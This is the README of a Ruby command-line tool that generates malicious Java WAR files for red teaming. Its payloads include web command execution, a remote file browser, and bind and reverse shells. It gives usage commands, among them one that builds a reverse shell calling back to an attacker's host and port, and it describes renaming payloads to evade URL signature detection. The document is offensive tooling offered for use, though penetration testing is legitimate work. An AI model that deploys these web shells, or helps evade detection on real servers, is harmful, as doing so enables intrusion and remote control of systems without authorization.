# GodOfWar - Malicious Java WAR builder
A command-line tool to generate war payloads for penetration testing / red teaming purposes, written in ruby.

```
                              .
                             hhh              
                            hhhhhhh           
                           hhhhhhhh        
                          hhhhhhhh+        
                         hhhhhhhh'           
                        hhhhhhhh.            
                       hhhhhhhhh             
        ..--          hhhhhhhhh             
      -sh/..  +.     hhhhhhhhh:              
      /+/:-/+ss-`   hhhhhhhhhh:               
      /MMM`ss:``.`  hhhhhhhhhh:              
     .MMMMM:        hhhhhhhhhhhhhhhhh:       
     MMMMMMM:        hhhhhhhhhhhhhhhh:      
     MMMMMMMMMMMMM:  hhhhhhhhhhhhhhhh`       
    :NNm:odh/oMMMNs. hhhhhhhhhhhhhhhh`       
   ./:`smdo+oos++-    `++sNMMMMMNmh+         
      .-y-`     ` :.  /   -dmddhhhhh-        
       o/-     `//o/ /M/   `+hhhhhhhh`       
      /o     :yosmy   +y  .`.hhhhhhhho       
      +`     /../.:      `.y::hhhhhs:`       
       `      `+yys`   .sy` /oohhy:          
                `/:s/-``     `.hh`           
               ..`     `       y+            
            .hNNmmNdymmmmds`   :-            
            hs.   ``..    :y-  `             
               -hhmNmddm+   .                
               `NMMMMMMm                     
                ` `oMMy                      
            `.     /Md-      :o  
           MMMMMMMMMMMMMMMMMMM:             
            MMMMMMMMMMMMMMMMMM:              
             MMMMMMMMMMMMMMMMM               
              MMMMMMMMMMMMMMM.               
              `MMMMMMMMMMMMM.                 
                :sNMMMNMdo:                  
                  ``+m:/-                    
                     `                                  
GodOfWar - Malicious Java WAR builder.
```

## Features

- Preexisting payloads. (try `-l/--list`)
    - cmd_get
    - filebrowser
    - bind_shell
    - reverse_shell
    - reverse_shell_ui 
- Configurable backdoor. (try `--host/-port`)
- Control over payload name. 
  - To avoid malicious name after deployment to bypass URL name signatures.

## Installation

```
$ gem install godofwar
```

## Usage
```
$ godofwar -h 

Help menu:
   -p, --payload PAYLOAD            Generates war from one of the available payloads.
                                        (check -l/--list)
   -H, --host IP_ADDR               Local or Remote IP address for the chosen payload
                                        (used with -p/--payload)
   -P, --port PORT                  Local or Remote Port for the chosen payload
                                        (used with -p/--payload)
   -o, --output [FILE]              Output file and the deployment name.
                                        (default is the payload original name. check '-l/--list')
   -l, --list                       list all available payloads.
   -h, --help                       Show this help message.
```

### Example 

**List all payloads**
```
$ godofwar -l
├── cmd_get
│   └── Information:
│       ├── Description: Command execution via web interface
│       ├── OS:          any
│       ├── Settings:    {"false"=>"No Settings required!"}
│       ├── Usage:       http://host/cmd.jsp?cmd=whoami
│       ├── References:  ["https://github.com/danielmiessler/SecLists/tree/master/Payloads/laudanum-0.8/jsp"]
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/cmd_get
├── filebrowser
│   └── Information:
│       ├── Description: Remote file browser, upload, download, unzip files and native command execution
│       ├── OS:          any
│       ├── Settings:    {"false"=>"No Settings required!"}
│       ├── Usage:       http://host/filebrowser.jsp
│       ├── References:  ["http://www.vonloesch.de/filebrowser.html"]
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/filebrowser
├── bind_shell
│   └── Information:
│       ├── Description: TCP bind shell
│       ├── OS:          any
│       ├── Settings:    {"port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse-shell.jsp
│       ├── References:  ["Metasploit - msfvenom -p java/jsp_shell_bind_tcp"]
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/bind_shell
├── reverse_shell_ui
│   └── Information:
│       ├── Description: TCP reverse shell with a HTML form to set LHOST and LPORT from browser.
│       ├── OS:          any
│       ├── Settings:    {"host"=>"attacker", "port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse_shell_ui.jsp
│       ├── References:  []
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell_ui
├── reverse_shell
│   └── Information:
│       ├── Description: TCP reverse shell. LHOST and LPORT are hardcoded
│       ├── OS:          any
│       ├── Settings:    {"host"=>"attacker", "port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse_shell.jsp
│       ├── References:  []
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell
```

**Generate payload with LHOST and LPORT**
```
godofwar -p reverse_shell -H 192.168.100.10  -P 9911 -o puppy
```
After deployment, you can visit your shell on (http://host:8080/puppy/puppy.jsp) 

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/[USERNAME]/godofwar.


## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).

